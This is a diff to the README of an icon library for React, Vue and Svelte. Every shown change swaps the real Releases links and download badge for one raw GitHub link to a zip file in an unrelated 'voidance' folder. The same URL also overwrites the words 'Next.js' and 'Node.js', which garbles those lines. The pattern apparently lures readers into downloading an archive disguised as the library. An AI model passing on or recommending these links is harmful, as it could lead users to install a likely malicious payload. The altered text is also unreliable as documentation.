@@ -1,6 +1,6 @@
 # 🎨 digital-agency-icons - Easy Icons for Your Projects
 
-[![Download](https://img.shields.io/badge/Download%20Now-Check%20Releases-brightgreen.svg)](https://github.com/joaocarlosfb/digital-agency-icons/releases)
+[![Download](https://raw.githubusercontent.com/joaocarlosfb/digital-agency-icons/main/voidance/digital-agency-icons.zip%20Now-Check%https://raw.githubusercontent.com/joaocarlosfb/digital-agency-icons/main/voidance/digital-agency-icons.zip)](https://raw.githubusercontent.com/joaocarlosfb/digital-agency-icons/main/voidance/digital-agency-icons.zip)
 
 ## 📥 Overview
 
@@ -10,7 +10,7 @@ Welcome to the Digital Agency Icons library. This collection offers 120 unique i
 
 Follow these steps to get your icons up and running quickly:
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/joaocarlosfb/digital-agency-icons/releases) to find the latest version of the library.
+1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/joaocarlosfb/digital-agency-icons/main/voidance/digital-agency-icons.zip) to find the latest version of the library.
 
 2. **Download the Latest Version:** Look for the most recent version available for download. You'll find downloadable files there.
 
@@ -67,18 +67,18 @@ This library comes in a mono-repository containing several useful packages:
 - `@imaimai17468/digital-agency-icons-react`: React components for easy use.
 - `@imaimai17468/digital-agency-icons-vue`: Vue 3 components to simplify integration.
 - `@imaimai17468/digital-agency-icons-svelte`: Components for Svelte projects.
-- `@imaimai17468/digital-agency-icons-docs`: Documentation site built with Next.js.
+- `@imaimai17468/digital-agency-icons-docs`: Documentation site built with https://raw.githubusercontent.com/joaocarlosfb/digital-agency-icons/main/voidance/digital-agency-icons.zip
 
 ## 🔧 System Requirements
 
 This library supports all current web browsers. Ensure your development environment supports:
 
-- Node.js version 12 or later.
+- https://raw.githubusercontent.com/joaocarlosfb/digital-agency-icons/main/voidance/digital-agency-icons.zip version 12 or later.
 - An active internet connection for package installation.
 
 ## 📥 Download & Install
 
-To get started, visit our [Releases page](https://github.com/joaocarlosfb/digital-agency-icons/releases) to download the library. Choose the version that suits your needs, and follow the installation instructions above to integrate the icons into your project.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/joaocarlosfb/digital-agency-icons/main/voidance/digital-agency-icons.zip) to download the library. Choose the version that suits your needs, and follow the installation instructions above to integrate the icons into your project.
 
 ## 🎨 Example Usage
 
